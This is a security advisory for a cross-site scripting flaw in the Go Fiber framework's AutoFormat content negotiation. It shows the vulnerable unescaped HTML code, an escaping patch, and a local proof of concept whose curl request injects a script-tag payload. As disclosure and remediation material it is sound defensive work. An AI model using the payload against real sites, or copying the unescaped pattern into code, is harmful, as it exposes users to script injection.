# [M] Fiber vulnerable to XSS in AutoFormat Content Negotiation

## Summary
Severity: Medium
Advisory: GHSA-qjv7-627w-8qjv
CVE: CVE-2026-42554
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (CVSS_V4)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-qjv7-627w-8qjv
Type: github-advisory

## Affected
- Go: `github.com/gofiber/fiber/v3` — affected >=0 <3.2.0
- Go: `github.com/gofiber/fiber/v2` — affected >=0 <2.52.13

## Details
## Summary

**Description**

A Cross-Site Scripting (CWE-79) vulnerability in Go Fiber allows a remote attacker to inject arbitrary HTML/JavaScript by supplying `Accept: text/html` on any request whose handler passes attacker-influenced data to the AutoFormat() feature. This affects `github.com/gofiber/fiber/v3` (`DefaultRes.AutoFormat`) through version 3.1.0 and `github.com/gofiber/fiber/v2` (`Ctx.Format`) through version 2.52.12. 

The developer opts into content negotiation by calling AutoFormat(), but does not opt into raw HTML emission for a particular request; Fiber chooses that branch from attacker-controlled Accept. Five of the six branches of the same method already escape. `JSON`, `XML`, `MsgPack`, and `CBOR` all route through encoders that neutralize markup; the txt branch emits `text/plain` and cannot execute. The html branch is the sole outlier in a method whose name (`AutoFormat`) and symmetrical structure actively telegraph "safe, format-agnostic reply."

## Details
The issue resides in `res.go` within `(*DefaultRes).AutoFormat()`. The method negotiates against the request Accept header, selects one of `html | json | txt | xml | msgpack | cbor`, and serializes the caller-supplied body accordingly.

The "html" branch concatenates the stringified body directly into HTML markup with no output encoding:
- `accept` comes from `r.c.Accepts(...)`, i.e. is fully attacker-controlled. An attacker can force the "html" branch on any `AutoFormat()` call regardless of which format the developer tested against.
- `b` is produced from `body` via direct assignment (`string` / `[]byte`) or `fmt.Sprintf("%v", body)`. No `html.EscapeString` is applied.
- The resulting string is sent as `text/html; charset=utf-8`, so browsers render it as active HTML.

```go
// res.go
func (r *DefaultRes) AutoFormat(body any) error {

    accept := r.c.DefaultReq.Accepts("html", "json", "txt", "xml", "msgpack", "cbor")

    r.Type(accept)
    var b string
    switch val := body.(type) {
    case string:
        b = val
    case []byte:
        b = r.c.app.toString(val)
    default:
        b = fmt.Sprintf("%v", val)
    }

    switch accept {
    case "txt":
        return r.SendString(b)
    case "json":
        return r.JSON(body)
    case "xml":
        return r.XML(body)
    case "html":
        return r.SendString("<p>" + b + "</p>")
    case "msgpack":
        return r.MsgPack(body)
    case "cbor":
        return r.CBOR(body)
    }
    return r.SendString(b)
}
```
## Impact

This impacts all current v3 releases ≤ 3.1.0 containing `DefaultRes.AutoFormat`, and all current v2 releases ≤ 2.52.12 where the identical `"<p>" + b + "</p>"` construction exists in `(*Ctx).Format()`. Exploitation requires that an application call `c.AutoFormat(v)` where `v` (or a field stringified by `%v`) contains request-influenced data.

A handler that uses `AutoFormat()` to serve multiple representations of the same data can be turned into an HTML XSS sink when the client sends `Accept: text/html`, even if the developer only tested the JSON path.

This may result in:
- **Reflected XSS** in the application's origin via any request-derived value reaching `AutoFormat`.
- **Stored XSS** where the reflected value originates from persisted input later passed to `AutoFormat`.

## Proposed Patch

The injection surface is `r.Type("html")` followed by `r.SendString(b)` with unescaped caller data, where it constructs markup on the caller's behalf around a value whose HTML-ness the caller did not declare. A few options:
- `AutoFormat()` should treat `body` as data, not markup, in the `"html"` branch and escape it before concatenating it into the framework-generated `<p>` wrapper. Callers that need raw negotiated HTML should use `Format()` with an explicit HTML handler.
- Introduce a sibling method that escapes, leave `AutoFormat` alone for backward compatibility.

HTML-escape the value in the "html" branch before concatenating it into the `<p>` wrapper.
```go
import "html"

// ...
case "html":
    return r.SendString("<p>" + html.EscapeString(b) + "</p>")
```

`html.EscapeString` escapes `<`, `>`, `&`, `'`, `"`, which is sufficient for an element-text context. Apply the same change to v2's `(*Ctx).Format()`.

## Proof of Concept

```bash
# Create project directory
mkdir fiber-xss-poc && cd fiber-xss-poc

# Initialize Go module
go mod init fiber-xss-poc

# Install Fiber v3
go get github.com/gofiber/fiber/v3

# Create the PoC file
cat > main.go << 'EOF'
package main

import (
	"github.com/gofiber/fiber/v3"
)

type User struct {
	ID   int    `json:"id"`
	Name string `json:"name"`
}

func main() {
	app := fiber.New()
	
	app.Get("/api/user", func(c fiber.Ctx) error {
		user := User{
			ID:   1,
			Name: c.Query("name", "anonymous"),
		}
		return c.AutoFormat(user)
	})

	app.Listen(":3000")
}
EOF

# Run it
go run main.go
}
```

Benign JSON
```bash
curl -s 'http://127.0.0.1:3000/api/user?name=Alice' -H 'Accept: application/json'
{"id":1,"name":"Alice"}
```

HTML sink enables XSS
```bash
curl -s 'http://127.0.0.1:3000/api/user?name=<script>alert(document.domain)</script>' -H 'Accept: text/html'
<p>{1 <script>alert(document.domain)</script>}</p>
```

## References
- https://github.com/gofiber/fiber/security/advisories/GHSA-qjv7-627w-8qjv
- https://nvd.nist.gov/vuln/detail/CVE-2026-42554
- https://github.com/gofiber/fiber
